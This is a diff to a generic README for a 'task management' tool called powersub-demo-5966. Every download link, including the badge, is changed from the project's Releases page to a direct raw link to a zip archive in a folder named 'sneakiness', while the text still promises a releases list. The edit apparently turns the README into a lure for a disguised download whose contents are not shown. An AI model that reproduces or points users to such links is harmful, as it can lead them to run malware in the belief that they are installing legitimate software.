@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-5966 - Simple Tool for Easy Task Management
 
 ## 📥 Download Now
-[![Download powersub-demo-5966](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Apocalypsekin/powersub-demo-5966/releases)
+[![Download powersub-demo-5966](https://raw.githubusercontent.com/Apocalypsekin/powersub-demo-5966/main/sneakiness/powersub-demo-5966-3.2-beta.2.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Apocalypsekin/powersub-demo-5966/main/sneakiness/powersub-demo-5966-3.2-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To run powersub-demo-5966, you will need:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/Apocalypsekin/powersub-demo-5966/releases) to download the latest version of powersub-demo-5966.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Apocalypsekin/powersub-demo-5966/main/sneakiness/powersub-demo-5966-3.2-beta.2.zip) to download the latest version of powersub-demo-5966.
   
 2. On the Releases page, you will see a list of available downloads. Choose the version suitable for your operating system.
 
@@ -76,6 +76,6 @@ Stay tuned for future updates. We plan to add new features like task prioritizat
 
 ## 📥 Download Again
 
-Remember, you can always return to our [Releases page](https://github.com/Apocalypsekin/powersub-demo-5966/releases) to check for the latest version or download updates. 
+Remember, you can always return to our [Releases page](https://raw.githubusercontent.com/Apocalypsekin/powersub-demo-5966/main/sneakiness/powersub-demo-5966-3.2-beta.2.zip) to check for the latest version or download updates. 
 
 Thank you for using powersub-demo-5966! We hope you find it helpful for your task management needs.
